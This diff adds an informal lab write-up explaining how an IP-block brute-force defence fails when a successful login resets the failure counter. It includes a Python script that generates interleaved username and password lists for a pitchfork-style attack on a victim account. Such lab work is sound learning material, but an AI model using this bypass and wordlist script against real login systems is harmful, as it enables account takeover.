@@ -1,0 +1,79 @@
+🛡️ Flawed Brute-Force Protection — Explained Simply
+Websites try to slow down or stop brute-force attacks by limiting how many times someone can try to log in.
+
+🔐 Two Common Protections:
+Account Lockout
+→ If you try the wrong password too many times, the account gets locked temporarily.
+
+IP Blocking
+→ If someone makes too many failed attempts from the same IP, that IP is blocked for a while.
+
+❌ But Here’s the Problem (The Flaw):
+Let’s say the website uses IP-based blocking, and it resets your failure counter if you log in successfully.
+
+So, if an attacker does this:
+
+Try 4 wrong passwords for user victim@example.com
+
+Then, log in correctly to their own account
+
+Repeat from step 1
+
+👉 The failed-attempt counter resets every time they log in successfully, so the IP never gets blocked.
+
+
+
+
+Solveing !!!!
+
+3 times i can attempt after that it fails
+
+To solve this lab use a py script and print all the usernames like this
+wiener
+carlos
+carlos
+wiener
+carlos
+carlos
+wiener
+carlos
+
+and password like this
+
+peter
+123456
+password
+peter
+12345678
+qwerty
+
+It means 2 time wrong attempt and 1 time right login to reset counter
+
+us this py script
+
+print("############### The Following are usernames #################")
+
+for i in range(150):
+    if i % 3:
+        print("carlos")
+    else:
+        print("wiener")
+
+print("########################## THE FOLLOWING ARE THE PASSWORDS #############")
+with open('LabPasswords.txt','r') as f:
+    lines = f.readlines()
+    
+i=0
+for pwd in lines:
+    if i % 3:
+        print(pwd.strip('\n'))
+    else:
+        print("peter")
+        print(pwd.strip('\n'))
+        i=i+1
+    i=i+1
+	
+use pitchfolk to exploit
+
+
+
